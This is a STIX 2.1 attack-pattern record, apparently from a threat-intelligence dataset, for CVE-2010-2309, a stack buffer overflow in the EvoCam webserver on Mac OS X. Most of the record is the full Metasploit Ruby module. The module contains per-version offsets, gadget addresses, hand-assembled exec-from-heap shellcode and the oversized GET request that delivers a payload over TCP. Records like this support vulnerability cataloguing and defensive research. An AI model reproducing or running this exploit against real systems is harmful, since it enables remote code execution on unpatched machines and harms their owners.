{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5a4028ad-2f93-4d8a-a51d-573e966256c1",
    "created": "2024-08-14T16:35:00.649925Z",
    "modified": "2024-08-14T16:35:00.649929Z",
    "name": "MacOS X EvoCam HTTP GET Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the web server provided with the EvoCam program for Mac OS X. We use Dino Dai Zovi's exec-from-heap technique to copy the payload from the non-executable stack segment to heap memory. Vulnerable versions include 3.6.6 3.6.7, and possibly earlier versions as well. EvoCam version 3.6.8 fixes the vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/http/evocam_webserver.rb",
            "external_id": "evocam_webserver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2309"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'MacOS X EvoCam HTTP GET Buffer Overflow',\n      'Description' => %q{\n          This module exploits a stack buffer overflow in the web server provided with the EvoCam\n        program for Mac OS X. We use Dino Dai Zovi's exec-from-heap technique to copy the payload\n        from the non-executable stack segment to heap memory. Vulnerable versions include 3.6.6,\n        3.6.7, and possibly earlier versions as well. EvoCam version 3.6.8 fixes the vulnerability.\n      },\n      'Author'         =>\n        [\n          'Paul Harrington', # Original Exploit Author and MSF Module\n          'dookie', # MSF Module Assistance\n        ],\n      'Platform'       => 'osx',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2010-2309'],\n          ['OSVDB', '65043'],\n          ['EDB', '12835'],\n        ],\n      'Payload'        =>\n        {\n          'Space' => 300,\n          'BadChars' => \"\\x00\\xff\\x09\\x0a\\x0b\\x0c\\x0c\\x0d\\x20\",\n          'StackAdjustment' => -3500,\n        },\n      'Privileged'     => false,\n      'Targets'        =>\n        [\n          [ 'Mac OS X 10.5.8 x86, EvoCam 3.6.6',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 1560,\n              'Writable' => 0x8fe66448,\n              'setjmp' => 0x8fe1cf38,\n              'strdup' => 0x8fe210dc,\n              'jmp_eax' => 0x8fe01041\n            }\n          ],\n          [ 'Mac OS X 10.5.8 x86, EvoCam 3.6.7',\n            {\n              'Arch' => ARCH_X86,\n              'Offset' => 1308,\n              'Writable' => 0x8fe66448,\n              'setjmp' => 0x8fe1cf38,\n              'strdup' => 0x8fe210dc,\n              'jmp_eax' => 0x8fe01041\n            }\n          ],\n\n        ],\n      'DisclosureDate' => '2010-06-01',\n      'DefaultTarget'  => 1))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n      ])\n  end\n\n  def make_exec_payload_from_heap_stub()\n    frag0 =\n      \"\\x90\" + # nop\n      \"\\x58\" + # pop eax\n      \"\\x61\" + # popa\n      \"\\xc3\"   # ret\n\n    frag1 =\n      \"\\x90\" +             # nop\n      \"\\x58\" +             # pop eax\n      \"\\x89\\xe0\" +         # mov eax, esp\n      \"\\x83\\xc0\\x0e\" +     # add eax, byte +0xc\n      \"\\x89\\x44\\x24\\x08\" + # mov [esp+0x8], eax\n      \"\\xc3\"               # ret\n\n    setjmp = target['setjmp']\n    writable = target['Writable']\n    strdup = target['strdup']\n    jmp_eax = target['jmp_eax']\n\n    exec_payload_from_heap_stub =\n      frag0 +\n      [setjmp].pack('V') +\n      [writable + 32, writable].pack(\"V2\") +\n      frag1 +\n      \"X\" * 20 +\n      [setjmp].pack('V') +\n      [writable + 24, writable, strdup, jmp_eax].pack(\"V4\") +\n      \"X\" * 4\n  end\n\n  def exploit\n    connect\n\n    offset = target['Offset']\n\n    buffer = \"GET \"\n    buffer << rand_text_alpha_upper(offset)\n    buffer << make_exec_payload_from_heap_stub()\n    buffer << \"\\x90\\x90\"\n    buffer << payload.encoded\n    buffer << \" HTTP/1.0\\r\\n\\r\\n\"\n\n    sock.put(buffer)\n    sock.close\n\n    handler()\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-06-01",
    "x_mitre_platforms": [
        "osx'"
    ]
}